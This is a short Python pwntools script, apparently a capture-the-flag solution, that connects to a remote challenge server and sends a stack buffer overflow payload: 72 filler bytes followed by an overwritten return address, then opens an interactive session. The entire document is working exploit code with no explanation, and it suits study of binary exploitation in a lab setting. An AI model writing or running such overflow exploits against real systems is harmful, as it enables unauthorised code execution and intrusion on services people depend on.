from pwn import *

#p = process("./pwn1")
p=remote("challs.n00bzunit3d.xyz", 35932)
payload = b"a"*72
payload += p64(0x000000000040124a)

p.recv()
p.sendline(payload)
p.interactive()
